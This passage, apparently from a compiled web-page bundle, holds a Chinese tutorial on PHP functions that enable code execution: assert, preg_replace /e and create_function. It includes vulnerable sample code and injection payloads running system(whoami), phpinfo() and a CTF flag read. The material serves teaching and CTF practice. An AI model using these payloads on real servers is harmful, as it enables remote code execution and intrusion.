\u4e2d\uff0c\u53ef\u4ee5\u662f\u4e00\u4e2a\u8fd4\u56de\u4efb\u4f55\u503c\u7684\u8868\u8fbe\u5f0f\uff0c\u5b83\u5c06\u88ab\u6267\u884c\u7ed3\u679c\u7528\u4e8e\u5224\u65ad\u65ad\u8a00\u662f\u5426\u6210\u529f\u3002"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.strong,{children:"description"})}),"\n"]}),"\n",(0,r.jsxs)(n.p,{children:["\u5982\u679c",(0,r.jsx)(n.code,{children:"assertion"}),"\u5931\u8d25\u4e86\uff0c\u9009\u9879",(0,r.jsx)(n.code,{children:"description"}),"\u5c06\u4f1a\u5305\u542b\u5728\u5931\u8d25\u4fe1\u606f\u91cc\u3002"]}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.strong,{children:"exception"})}),"\n"]}),"\n",(0,r.jsxs)(n.p,{children:["\u5728PHP 7\u4e2d\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u53ef\u4ee5\u662f\u4e00\u4e2a",(0,r.jsx)(n.code,{children:"Throwable"}),"\u5bf9\u8c61\uff0c\u800c\u4e0d\u662f\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u5982\u679c\u65ad\u8a00\u5931\u8d25\u4e14\u542f\u7528\u4e86",(0,r.jsx)(n.code,{children:"assert.exception"}),"\uff0c\u90a3\u4e48\u8be5\u5bf9\u8c61\u5c06\u88ab\u629b\u51fa"]}),"\n",(0,r.jsx)(n.h5,{id:"assert\u914d\u7f6e",children:"assert()\u914d\u7f6e"}),"\n",(0,r.jsxs)(n.table,{children:[(0,r.jsx)(n.thead,{children:(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.th,{children:"\u914d\u7f6e\u9879"}),(0,r.jsx)(n.th,{children:"\u9ed8\u8ba4\u503c"}),(0,r.jsx)(n.th,{style:{textAlign:"left"},children:"\u53ef\u9009\u503c"})]})}),(0,r.jsxs)(n.tbody,{children:[(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:"zend.assertions"}),(0,r.jsx)(n.td,{children:"1"}),(0,r.jsx)(n.td,{style:{textAlign:"left"},children:"1 - \u751f\u6210\u548c\u6267\u884c\u4ee3\u7801(\u5f00\u53d1\u6a21\u5f0f) 0 - \u751f\u6210\u4ee3\u7801\uff0c\u4f46\u5728\u6267\u884c\u65f6\u8df3\u8fc7\u5b83 -1 - \u4e0d\u751f\u6210\u4ee3\u7801(\u751f\u4ea7\u73af\u5883)"})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:"assert.exception"}),(0,r.jsx)(n.td,{children:"0"}),(0,r.jsx)(n.td,{style:{textAlign:"left"},children:"1 - \u65ad\u8a00\u5931\u8d25\u65f6\u629b\u51fa\uff0c\u53ef\u4ee5\u629b\u51fa\u5f02\u5e38\u5bf9\u8c61\uff0c\u5982\u679c\u6ca1\u6709\u63d0\u4f9b\u5f02\u5e38\uff0c\u5219\u629b\u51faAssertionError\u5bf9\u8c61\u5b9e\u4f8b 0 - \u4f7f\u7528\u6216\u751f\u6210Throwable\uff0c\u4ec5\u4ec5\u662f\u57fa\u4e8e\u5bf9\u8c61\u751f\u6210\u7684\u8b66\u544a\u800c\u4e0d\u662f\u629b\u51fa\u5bf9\u8c61(\u4e0ePHP 5 \u517c\u5bb9)"})]})]})]}),"\n",(0,r.jsxs)(n.p,{children:["\u6240\u4ee5\u641e\u4e86\u8fd9\u4e48\u591a\uff0c",(0,r.jsx)(n.code,{children:"assert()"}),"\u51fd\u6570\u5230\u5e95\u662f\u5e72\u4ec0\u4e48\u7684\u5462\uff1f\u7528\u6211\u7684\u7406\u89e3\u6765\u8bf4\uff0c",(0,r.jsx)(n.code,{children:"assert()"}),"\u51fd\u6570\u662f\u5904\u7406\u5f02\u5e38\u7684\u4e00\u79cd\u5f62\u5f0f\uff0c\u76f8\u5f53\u4e8e\u4e00\u4e2aif\u6761\u4ef6\u8bed\u53e5\u7684\u5b8f\u5b9a\u4e49\u4e00\u6837\u3002"]}),"\n",(0,r.jsx)(n.p,{children:"\u4e00\u4e2aPHP 7 \u4e2d\u7684\u793a\u4f8b"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:"<?php\n    assert_options(ASSERT_EXCEPTION, 1);    // \u8bbe\u7f6e\u5728\u65ad\u8a00\u5931\u8d25\u65f6\u4ea7\u751f\u5f02\u5e38\n    try {\n        assert(1 == 2, new AssertionError('\u56e0\u4e3a1\u4e0d\u7b49\u4e8e2\uff0c\u6240\u4ee5\u524d\u9762\u65ad\u8a00\u5931\u8d25\uff0c\u629b\u51fa\u5f02\u5e38'));  // \u7528 AssertionError \u5f02\u5e38\u66ff\u4ee3\u666e\u901a\u5b57\u7b26\u4e32\n    } catch (Throwable $error) {\n        echo $error->getMessage();\n    }\n?>\n    \n    \n\u6267\u884c\u7ed3\u679c\u2014\u2014>\u56e0\u4e3a1\u4e0d\u7b49\u4e8e2\uff0c\u6240\u4ee5\u524d\u9762\u65ad\u8a00\u5931\u8d25\uff0c\u629b\u51fa\u5f02\u5e38\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u8fd9\u91cc\u5c31\u662f\u5b9e\u4f8b\u5316\u4e00\u4e2a\u5bf9\u8c61\uff0c\u7528\u8fd9\u4e2a\u5bf9\u8c61\u6765\u629b\u51fa\u5f02\u5e38\u3002"}),"\n",(0,r.jsx)(n.p,{children:"\u4e00\u4e2aphp 5 \u4e2d\u7684\u793a\u4f8b"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:"<?php\n\tassert(1 == 2,'\u524d\u9762\u65ad\u8a00\u5931\u8d25\uff0c\u629b\u51fa\u5f02\u5e38');\n?>\n    \n\u6267\u884c\u7ed3\u679c\u2014\u2014>Warning: assert(): \u524d\u9762\u65ad\u8a00\u5931\u8d25\uff0c\u629b\u51fa\u5f02\u5e38 failed in D:\\phpstudy_pro\\WWW\\1.php on line     \n<?php\n\tassert(1 == 2);\n?>\n    \n\u6267\u884c\u7ed3\u679c\u2014\u2014>Warning: assert(): Assertion failed in D:\\phpstudy_pro\\WWW\\1.php on line ```\n\n\n\u6240\u4ee5PHP 7 \u76f8\u8f83\u4e8ePHP 5 \u5c31\u662f\u591a\u4e86\u4e2a\u7528Throwable\u6765\u53d1\u51fa\u8b66\u544a\u3002\n\n\u90a3\u4e48\uff0c\u5982\u679c\u524d\u9762\u65ad\u8a00\u6210\u529f\u5462\uff1f\u4f1a\u53d1\u751f\u4ec0\u4e48\u5462?\u6765\u4e2a\u6700\u7b80\u5355\uff0c\u4e5f\u662f\u6211\u4eec\u6bd4\u8f83\u559c\u6b22\u7684\u793a\u4f8b\n\n```php\n<?php\n\t$code = \"system(whoami)\"\n\tassert($code);\n?>\n    \n\u6267\u884c\u7ed3\u679c\u2014\u2014>desktop-m61j5j6\\admin\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u8fd9\u6bb5\u4ee3\u7801\u5728PHP 5 \u548cPHP 7 \u4e2d\u90fd\u4f1a\u8fd4\u56de\u547d\u4ee4\u6267\u884c\u7ed3\u679c\uff0c\u867d\u7136PHP 7 \u4e2d\u5bf9\u65ad\u8a00\u51fd\u6570\u7684\u53c2\u6570\u7a0d\u4f5c\u4e86\u6539\u53d8\uff0c\u4f46\u662f\u4e3a\u4e86\u517c\u5bb9\u4f4e\u7248\u672c\uff0c\u6240\u4ee5\u8fd8\u662f\u4f1a\u76f4\u63a5\u8fd4\u56de\u7ed3\u679c\u3002"}),"\n",(0,r.jsx)(n.h4,{id:"preg_replace",children:"preg_replace()"}),"\n",(0,r.jsx)(n.p,{children:"\u901a\u8fc7\u51fd\u6570\u540d\u5b57\u6211\u4eec\u4e5f\u5e94\u8be5\u80fd\u591f\u4e86\u89e3\u51fd\u6570\u5927\u6982\u4f5c\u7528\uff0c\u6b64\u51fd\u6570\u6267\u884c\u4e00\u4e2a\u6b63\u5219\u8868\u8fbe\u5f0f\u7684\u641c\u7d22\u548c\u66ff\u6362\u3002"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:"mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &$count ]] )\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u641c\u7d22 subject \u4e2d\u5339\u914d pattern \u7684\u90e8\u5206\uff0c \u4ee5 replacement \u8fdb\u884c\u66ff\u6362\u3002"}),"\n",(0,r.jsx)(n.h5,{id:"\u53c2\u6570\u8bf4\u660e",children:"\u53c2\u6570\u8bf4\u660e\uff1a"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"$pattern: \u8981\u641c\u7d22\u7684\u6a21\u5f0f\uff0c\u53ef\u4ee5\u662f\u5b57\u7b26\u4e32\u6216\u4e00\u4e2a\u5b57\u7b26\u4e32\u6570\u7ec4\u3002"}),"\n",(0,r.jsx)(n.li,{children:"$replacement: \u7528\u4e8e\u66ff\u6362\u7684\u5b57\u7b26\u4e32\u6216\u5b57\u7b26\u4e32\u6570\u7ec4\u3002"}),"\n",(0,r.jsx)(n.li,{children:"$subject: \u8981\u641c\u7d22\u66ff\u6362\u7684\u76ee\u6807\u5b57\u7b26\u4e32\u6216\u5b57\u7b26\u4e32\u6570\u7ec4\u3002"}),"\n",(0,r.jsx)(n.li,{children:"$limit: \u53ef\u9009\uff0c\u5bf9\u4e8e\u6bcf\u4e2a\u6a21\u5f0f\u7528\u4e8e\u6bcf\u4e2a subject \u5b57\u7b26\u4e32\u7684\u6700\u5927\u53ef\u66ff\u6362\u6b21\u6570\u3002 \u9ed8\u8ba4\u662f-1\uff08\u65e0\u9650\u5236\uff09\u3002"}),"\n",(0,r.jsx)(n.li,{children:"$count: \u53ef\u9009\uff0c\u4e3a\u66ff\u6362\u6267\u884c\u7684\u6b21\u6570\u3002"}),"\n"]}),"\n",(0,r.jsxs)(n.p,{children:["\u90a3\u8fd9\u4e2a\u51fd\u6570\u8ddf\u6211\u4eec\u547d\u4ee4\u6267\u884c\u6709\u4ec0\u4e48\u5173\u7cfb\u5462\uff1f\u4ec5\u4ec5\u770b\u4e0a\u9762\u7684\u5b98\u65b9\u89e3\u91ca\u4f3c\u4e4e\u770b\u4e0d\u51fa\u4ec0\u4e48\uff0c\u4f46\u662f",(0,r.jsx)(n.code,{children:"preg_repace()"}),"\u6709\u4e00\u4e2a\u6a21\u5f0f\u662f/e\u6a21\u5f0f\uff0c\u8fd9\u4e2a\u6a21\u5f0f\u5c31\u4f1a\u53d1\u751f\u4ee3\u7801\u6267\u884c\u7684\u95ee\u9898\uff0c\u4e3a\u4ec0\u4e48\u5462\uff1f"]}),"\n",(0,r.jsx)(n.p,{children:"\u770b\u4e00\u4e2a\u6848\u4f8b"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:"<?php\n     function Ameng($regex, $value){\n        return preg_replace('/(' . $regex . ')/ei', 'strtolower(\"\\\\1\")', $value);\n    }\n    foreach ($_GET as $regex => $value){\n        echo Ameng($regex, $value) . \"\\n\";\n    }\n?>\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u4e0a\u9762\u8fd9\u6bb5\u6211\u4eec\u9700\u8981\u6ce8\u610f\u7684\u5c31\u662f\\1,\\1\u5728\u6b63\u5219\u8868\u8fbe\u5f0f\u662f\u53cd\u5411\u5f15\u7528\u7684\u610f\u601d\uff0c\u7b80\u800c\u8a00\u4e4b\u5c31\u662f\u6307\u5b9a\u4e00\u4e2a\u5b50\u5339\u914d\u9879\u3002"}),"\n",(0,r.jsx)(n.p,{children:"\u9488\u5bf9\u4e0a\u9762\u6848\u4f8b\uff0c\u6211\u4eec\u6765\u4e2apayload\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:"payload=/?.*={${phpinfo()}}\n\u6240\u4ee5\u8bed\u53e5\u5c31\u6210\u4e86\u8fd9\u6837\npreg_replace('/(.*)/ei', 'strtolower(\"\\\\1\")', {${phpinfo()}});\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u90a3\u4e48\u6211\u4eec\u76f4\u63a5\u628a\u8fd9\u6bb5\u4ee3\u7801\u653e\u5230\u9875\u9762"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:"<?php\n    preg_replace('/(.*)/ei', 'strtolower(\"\\\\1\")', '{${phpinfo()}}');\n?>\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u8bbf\u95ee\u9875\u9762\uff0c\u7ed3\u679c\u5982\u4e0b\uff1a"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{src:"https://cdn.wjlin0.com/img/202508191648340.png",alt:"img"})}),"\n",(0,r.jsx)(n.p,{children:"\u6211\u4eec\u770b\u5230\u6210\u529f\u6267\u884c\u4e86\u4ee3\u7801\u3002"}),"\n",(0,r.jsxs)(n.p,{children:["\u4f46\u662f\u8fd9\u91cc\u6211\u662f\u76f4\u63a5\u5c06\u8fd9\u6bb5\u4ee3\u7801\u5199\u5230\u4e86\u6587\u4ef6\u91cc\uff0c\u90a3\u4e48\u5982\u679c\u6211\u4eec\u662f\u901a\u8fc7GET\u4f20\u53c2\u5f97\u5230\u53c2\u6570\uff0c\u8fd9\u91cc\u9488\u5bf9\u4e0a\u9762\u90a3\u4e2a\u6848\u4f8b\u5c31\u9700\u8981\u6ce8\u610f\u4e00\u70b9\uff0c\u5728\u901a\u8fc7GET\u4f20\u53c2\u65f6\uff0c",(0,r.jsx)(n.code,{children:".*"}),"\u4f1a\u88ab\u66ff\u6362\u4e3a",(0,r.jsx)(n.code,{children:"_*"}),"\u5bfc\u81f4\u6211\u4eec\u8981\u7684\u6b63\u5219\u88ab\u66ff\u6362\u4e86\uff0c\u8fbe\u4e0d\u5230\u6211\u4eec\u7684\u6548\u679c\uff0c\u6240\u4ee5\u8fd9\u91cc\u53ef\u7528\u4f7f\u7528\u4e00\u4e9b\u5176\u4ed6\u7684\u6b63\u5219\u8868\u8fbe\u5f0f\u6765\u8fbe\u5230\u76ee\u7684\uff0c\u6bd4\u5982\u901a\u8fc7GET\u4f20\u53c2\u65f6\u6211\u4eec\u7684\u53c2\u6570\u53ef\u4ee5\u4f20\u5165",(0,r.jsx)(n.code,{children:"\\S*"}),"\u4ece\u800c\u8fbe\u5230\u540c\u6837\u76ee\u7684\u3002\u6240\u4ee5\u4ee5\u540e\u518d\u9047\u5230\u8fd9\u4e2a\u51fd\u6570\u7684\u65f6\u5019\uff0c\u8981\u7559\u4e2a\u5fc3\u773c\u4e86\u3002\u4e0d\u8fc7\uff0c\u8fd9\u91cc\u8981\u8865\u5145\u4e00\u70b9\uff0c\u5c31\u662f",(0,r.jsx)(n.code,{children:"preg_replace()"}),"\u51fd\u6570\u5728PHP 7 \u540e\u4fbf\u4e0d\u518d\u652f\u6301\uff0c\u4f7f\u7528",(0,r.jsx)(n.code,{children:"preg_replace_callback()"}),"\u8fdb\u884c\u66ff\u6362\u4e86\uff0c\u53d6\u6d88\u4e86\u4e0d\u5b89\u5168\u7684",(0,r.jsx)(n.code,{children:"\\e"}),"\u6a21\u5f0f\u3002"]}),"\n",(0,r.jsx)(n.h4,{id:"create_function",children:"create_function()"}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.code,{children:"create_function()"}),"\u7528\u6765\u521b\u5efa\u4e00\u4e2a\u533f\u540d\u51fd\u6570"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:"create_function( string $args, string $code) : string\n"})}),"\n",(0,r.jsx)(n.h5,{id:"\u53c2\u6570-1",children:"\u53c2\u6570"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"string $args \u58f0\u660e\u7684\u51fd\u6570\u53d8\u91cf\u90e8\u5206"}),"\n",(0,r.jsx)(n.li,{children:"string $code \u8981\u6267\u884c\u7684\u4ee3\u7801"}),"\n"]}),"\n",(0,r.jsx)(n.h5,{id:"\u8fd4\u56de\u503c-1",children:"\u8fd4\u56de\u503c"}),"\n",(0,r.jsx)(n.p,{children:"\u8fd4\u56de\u552f\u4e00\u7684\u51fd\u6570\u540d\u79f0\u4f5c\u4e3a\u5b57\u7b26\u4e32\u6216\u8005\u8fd4\u56deFALSE\u9519\u8bef"}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.code,{children:"create_function()"}),"\u51fd\u6570\u5728\u5185\u90e8\u6267\u884c",(0,r.jsx)(n.code,{children:"eval()"}),"\u51fd\u6570\uff0c\u6240\u4ee5\u6211\u4eec\u5c31\u53ef\u4ee5\u5229\u7528\u8fd9\u4e00\u70b9\uff0c\u6765\u6267\u884c\u4ee3\u7801\u3002\u5f53\u7136\u6b63\u56e0\u4e3a\u5b58\u5728\u5b89\u5168\u95ee\u9898\uff0c\u6240\u4ee5\u5728PHP 7.2 \u4e4b\u540e\u7684\u7248\u672c\u4e2d\u5df2\u7ecf\u5e9f\u5f03\u4e86",(0,r.jsx)(n.code,{children:"create_function()"}),"\u51fd\u6570\uff0c\u4f7f\u7528\u533f\u540d\u51fd\u6570\u6765\u4ee3\u66ff\u3002\u6240\u4ee5\u8fd9\u91cc\u4e3a\u4e86\u6f14\u793a\u8fd9\u4e2a\u51fd\u6570\uff0c\u6211\u91c7\u7528\u7684\u662fPHP 5 \u7684\u73af\u5883\u3002\u90a3\u4e48\u8fd9\u4e2a\u51fd\u6570\u5230\u5e95\u600e\u4e48\u7528\u5462\uff1f"]}),"\n",(0,r.jsx)(n.p,{children:"\u90a3\u4e48\u6765\u770b\u6211\u5199\u7684\u4e00\u4e2a\u7b80\u5355\u7684\u6848\u4f8b"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:"<?php\n    $onefunc = create_function('$a','return system($a);');\n\t$onefunc(whoami);\n?>\n    \n\u6267\u884c\u7ed3\u679c\u2014\u2014>desktop-m61j5j6\\admin\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u6211\u4eec\u770b\u5230\u4f7f\u7528\u6b64\u51fd\u6570\u4e3a\u6211\u4eec\u76f8\u5f53\u4e8e\u521b\u9020\u4e86\u4e00\u4e2a\u533f\u540d\u7684\u51fd\u6570\uff0c\u7ed9\u5b83\u8d4b\u4ee5\u76f8\u5e94\u7684\u53d8\u91cf\uff0c\u5c31\u6267\u884c\u4e86\u6211\u4eec\u8981\u6267\u884c\u7684\u4ee3\u7801\u3002"}),"\n",(0,r.jsx)(n.p,{children:"\u90a3\u4e48\u63a5\u4e0b\u6765\u6211\u4eec\u6765\u770b\u4e00\u4e2a\u7b80\u5355\u7684\u6848\u4f8b"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:"<?php\n\terror_reporting(0);\n\t$sort_by = $_GET['sort_by'];\n\t$sorter = 'strnatcasecmp';\n\t$databases=array('1234','4321');\n\t$sort_function = ' return 1 * ' . $sorter . '($a[\"' . $sort_by . '\"], $b[\"' . $sort_by . '\"]);';\n\tusort($databases, create_function('$a, $b', $sort_function));\n?>\n"})}),"\n",(0,r.jsxs)(n.p,{children:["\u8fd9\u4e2a\u4e3b\u8981\u529f\u80fd\u5c31\u662f\u5b9e\u73b0\u6392\u5e8f\uff0c\u8fd9\u6bb5\u4ee3\u7801\u5c31\u8c03\u7528\u4e86",(0,r.jsx)(n.code,{children:"create_function()"}),"\u51fd\u6570\uff0c\u90a3\u4e48\u6211\u4eec\u80fd\u5426\u5229\u7528\u8fd9\u4e2a\u51fd\u6570\u6267\u884c\u6211\u4eec\u60f3\u8981\u6267\u884c\u7684\u4ee3\u7801\u5462\uff1f"]}),"\n",(0,r.jsx)(n.p,{children:"\u5f53\u7136\u53ef\u4ee5\uff0c\u6211\u4eec\u53ea\u9700\u8981\u5728\u4f20\u53c2\u65f6\u5c06\u524d\u9762\u7684\u7b26\u53f7\u95ed\u5408\uff0c\u7136\u540e\u8f93\u5165\u6211\u4eec\u60f3\u8981\u6267\u884c\u7684\u4ee3\u7801\u5373\u53ef\u3002"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:"payload='\"]);}phpinfo();/*\n\u6267\u884cpayload\u524d\uff1a$sort_function = ' return 1 * ' . $sorter . '($a[\"' . $sort_by . '\"], $b[\"' . $sort_by . '\"]);';\n\u6267\u884cpayloda\u540e\uff1a$sort_function = ' return 1 * ' . $sorter . '($a[\"' . $sort_by '\"]);}phpinfo();/*\n"})}),"\n",(0,r.jsxs)(n.p,{children:["\u770b\u5230\u8fd9\u91cc\uff0c\u4f60\u53ef\u80fd\u4f1a\u6709\u7a0d\u5fae\u7591\u60d1\uff0c\u5c31\u662f\u4f60\u95ed\u5408\u5c31\u95ed\u5408\u5427\uff0c\u4e3a\u4ec0\u4e48\u540e\u9762\u591a\u4e86\u4e2a",(0,r.jsx)(n.code,{children:";}"}),"\uff0c\u4e0d\u77e5\u9053\u4f60\u662f\u5426\u60f3\u5230\u4e86\u8fd9\u4e00\u70b9\uff1f"]}),"\n",(0,r.jsx)(n.p,{children:"\u90a3\u4e48\u6211\u5c31\u6765\u5206\u6790\u4e00\u4e0b\u8fd9\u4e2a\uff0c\u4e0a\u9762\u7684\u90a3\u6bb5\u6267\u884c\u4ee3\u7801\uff0c\u5b9e\u9645\u4e0a\u5c31\u662f\u4e00\u4e2a\u533f\u540d\u51fd\u6570\u7684\u521b\u5efa\uff0c\u65e2\u7136\u662f\u4e00\u4e2a\u51fd\u6570\uff0c\u6ce8\u610f\u662f\u4e00\u4e2a\u51fd\u6570\uff0c\u90a3\u4e48\u4f60\u89c9\u5f97\u6709\u6ca1\u6709\u82b1\u62ec\u53f7\u5462\uff1f\u770b\u6211\u5982\u4e0b\u4ee3\u7801"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:"<?php\n    //\u672a\u95ed\u5408\u4e4b\u524d\n    function sort($a,$b){\n    ' return 1 * ' . $sorter . '($a[\"' . $sort_by . '\"], $b[\"' . $sort_by . '\"]);';\n\t}\n\t//\u95ed\u5408\u4e4b\u540e\n\tfunction sort($a,$b){\n        ' return 1 * ' . $sorter . '($a[\"' . $sort_by '\"]);\n    }\n        phpinfo();/*\n    }\n?>\n"})}),"\n",(0,r.jsxs)(n.p,{children:["\u53ef\u4ee5\u770b\u5230\uff0c\u6211\u4eec\u501f\u7528\u4e86\u533f\u540d\u51fd\u6570\u7684\u4f4d\u7f6e\uff0c\u63d2\u5165\u4e86\u6211\u4eec\u8981\u6267\u884c\u7684\u4ee3\u7801\uff0c\u7136\u540e\u7b49\u8fd9\u4e2a\u533f\u540d\u51fd\u6570\u88ab",(0,r.jsx)(n.code,{children:"create_function"}),"\u5f53\u4f5c",(0,r.jsx)(n.code,{children:"$code"}),"\u6267\u884c\u7684\u65f6\u5019\uff0c\u662f\u4e0d\u662f\u4ee3\u7801\u5c31\u88ab\u6267\u884c\u4e86\u3002"]}),"\n",(0,r.jsx)(n.p,{children:"\u7ed3\u679c\uff1a"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{src:"https://cdn.wjlin0.com/img/202508191648342.png",alt:"img"})}),"\n",(0,r.jsxs)(n.p,{children:["\u90a3\u4e48",(0,r.jsx)(n.code,{children:"creat_function"}),"\u51fd\u6570\u8fd8\u6709\u522b\u7684\u7528\u6cd5\u5417\uff1f\u6211\u4eec\u5c06\u4e0a\u9762\u4e00\u4e2a\u6848\u4f8b\u7b80\u5355\u7684\u4fee\u6539\u4e00\u4e0b\uff0c\u4ee3\u7801\u5982\u4e0b\uff1a"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:'<?php\n    $onefunc = create_function("","die(`cat flag.php`)");\n\t$_GET[\'func_name\']();\n\tdie();\n?>\n'})}),"\n",(0,r.jsxs)(n.p,{children:["\u4ee3\u7801\u7b80\u5355\u7684\u6765\u770b\uff0c\u6211\u4eec\u53ea\u9700\u8981\u6267\u884c",(0,r.jsx)(n.code,{children:"$onefunc"}),"\u5c31\u80fd\u5f97\u5230flag\uff0c\u4f46\u662f\u6211\u4eec\u4e0d\u77e5\u9053\u8fd9\u4e2a\u51fd\u6570\u7684\u540d\u79f0\u3002\u5982\u679c\u5728\u4e0d\u77e5\u9053\u51fd\u6570\u540d\u79f0\u7684\u60c5\u51b5\u4e0b\u6267\u884c\u51fd\u6570\u5462\uff1f\u8fd9\u91cc\u5c31\u7528\u5230\u4e86",(0,r.jsx)(n.code,{children:"creat_function"}),"\u51fd\u6570\u7684\u4e00\u4e2a\u6f0f\u6d1e\u3002\u8fd9\u4e2a\u51fd\u6570\u5728creat\u4e4b\u540e\u4f1a\u81ea\u52a8\u751f\u6210\u4e00\u4e2a\u51fd\u6570\u540d\u4e3a",(0,r.jsx)(n.code,{children:"%00lambda_%d"}),"\u7684\u533f\u540d\u51fd\u6570\u3002",(0,r.jsx)(n.code,{children:"%d"}),"\u7684\u503c\u662f\u4e00\u76f4\u9012\u589e\u7684\uff0c\u4f1a\u4e00\u76f4\u9012\u589e\u5230\u6700\u5927\u957f\u5ea6\u76f4\u5230\u7ed3\u675f\u3002\u6240\u4ee5\u8fd9\u91cc\u53ef\u4ee5\u901a\u8fc7\u591a\u8fdb\u7a0b\u6216\u8005\u591a\u7ebf\u7a0b\u8bbf\u95ee\uff0c\u4ece\u800c\u770b\u5230flag\u3002"]}),"\n",(0,r.jsxs)(n.p,{children:["\u6240\u4ee5\uff0c\u4ee5\u540e\u518d\u4ee3\u7801\u4e2d\u5982\u679c\u770b\u5230\u8c03\u7528",(0,r.jsx)(n.code,{children:"create_function()"}),"\u8981\u5c0f\u5fc3\u4e00\u70b9\uff0c\u4f46\u662f\u5982\u679c\u662fCTF\u9898\u76ee\u7684\u8bdd\uff0c\u4e0d\u4f1a\u8fd9\u4e48\u76f4\u63a5\u5c31\u5427\u8fd9\u4e2a\u51fd\u6570\u66b4\u9732\u7ed9\u4f60\uff0c\u5b83\u53ef\u80fd\u4f1a\u7528\u5230\u62fc\u63a5\u6216\u8005\u66ff\u6362\u6765\u6784\u9020\u8fd9\u4e2a\u51fd\u6570\u3002\u6700\u540e\u518d\u5f3a\u8c03\u4e00\u4e0b\uff0c",(0,r.jsx)(n.code,{children:"create_function"}),"\u51fd\u6570\u5728PHP 7.2 \u7248\u672c\u4e4b\u540e\u5c31\u5df2\u7ecf\u88ab\u5e9f\u5f03\u4e86\u3002"]}),"\n",(0,r.jsx)(n.h4,{id:"array_map",children:"array_map()"}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.code,{children:"array_map()"}),"\u4e3a\u6570\u7ec4\u7684\u6bcf\u4e2a\u5143\u7d20\u5e94\u7528\u56de\u8c03\u51fd\u6570"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:"array_map( callable $callback, array $array1[, array $...] ) : array\n"})}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.strong,{children:"array_map()"}),"\uff1a\u8fd4\u56de\u6570\u7ec4\uff0c\u662f\u4e3a ",(0,r.jsx)(n.code,{children:"array1"})," \u6bcf\u4e2a\u5143\u7d20\u5e94\u7528 ",(0,r.jsx)(n.code,{children:"callback"}),"\u51fd\u6570\u4e4b\u540e\u7684\u6570\u7ec4\u3002",(0,r.jsx)(n.code,{children:"callback"})," \u51fd\u6570\u5f62\u53c2\u7684\u6570\u91cf\u548c\u4f20\u7ed9",(0,r.jsx)(n.code,{children:"array_map()"})," \u6570\u7ec4\u6570\u91cf\uff0c\u4e24\u8005\u5fc5\u987b\u4e00\u6837\u3002"]}),"\n",(0,r.jsx)(n.h5,{id:"\u53c2\u6570-2",children:"\u53c2\u6570"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"callback\uff1a\u56de\u8c03\u51fd\u6570\uff0c\u5e94\u7528\u5230\u6bcf\u4e2a\u6570\u7ec4\u91cc\u7684\u6bcf\u4e2a\u5143\u7d20\u3002"}),"\n",(0,r.jsxs)(n.li,{children:["array1\uff1a\u6570\u7ec4\uff0c\u904d\u5386\u8fd0\u884c",(0,r.jsx)(n.code,{children:"callback"}),"\u51fd\u6570\u3002"]}),"\n",(0,r.jsxs)(n.li,{children:["...\uff1a\u6570\u7ec4\u5217\u8868\uff0c\u6bcf\u4e2a\u90fd\u904d\u5386\u8fd0\u884c",(0,r.jsx)(n.code,{children:"callback"}),"\u51fd\u6570\u3002"]}),"\n"]}),"\n",(0,r.jsx)(n.h5,{id:"\u8fd4\u56de\u503c-2",children:"\u8fd4\u56de\u503c"}),"\n",(0,r.jsxs)(n.p,{children:["\u8fd4\u56de\u6570\u7ec4\uff0c\u5305\u542b",(0,r.jsx)(n.code,{children:"callback"}),"\u51fd\u6570\u5904\u7406\u4e4b\u540e",(0,r.jsx)(n.code,{children:"array1"}),"\u7684\u6240\u6709\u5143\u7d20\u3002"]}),"\n",(0,r.jsxs)(n.p,{children:["\u8bf4\u4e86\u8fd9\u4e48\u591a\u5b98\u65b9\u7684\u51fd\u6570\u89e3\u91ca\uff0c\u90a3\u4e48\u8fd9\u4e2a\u51fd\u6570\u5230\u5e95\u5982\u4f55\u4f7f\u7528\u5462\uff1f\u7b80\u800c\u8a00\u4e4b\uff0c\u8fd9\u4e2a\u51fd\u6570\u7684\u4f5c\u75